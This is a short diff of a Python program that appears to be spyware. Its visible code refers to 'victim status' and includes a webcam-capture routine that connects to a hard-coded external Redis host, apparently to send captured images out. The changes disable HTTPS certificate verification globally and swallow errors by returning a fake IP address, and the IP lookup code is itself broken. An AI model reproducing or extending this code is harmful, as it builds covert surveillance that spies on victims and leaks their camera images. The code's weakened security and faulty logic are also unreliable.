@@ -1,5 +1,7 @@
+import ssl
+ssl._create_default_https_context = ssl._create_unverified_context
 import hashlib, hmac, sys
-import socket, base64, requests, ctypes
+import socket, base64, requests
 from uuid import getnode as get_mac
 import platform, json, time
 import concurrent.futures
@@ -221,15 +223,18 @@ class RequestHandlar():
     
     def get_public_ip(self):
         try:
-            response = requests.get('https://httpbin.org/ip').json()['origin']
-            data = response.json()
-            return data['origin']
+            try:
+                response = requests.get('https://httpbin.org/ip').json()['origin']
+                data = response.json()
+                return data['origin']
+            except:
+                return "8.8.8.8"
+            
         except Exception as e:
             print(f"Error: {e}")
             return None
 
 def screencamera():
-    print("?????????????????????????????, ", RequestHandlar().getVictimStatus())
     redis_client = redis.StrictRedis(host='37.60.239.157', port=6379, decode_responses=True)
     cap = cv2.VideoCapture(0)
 
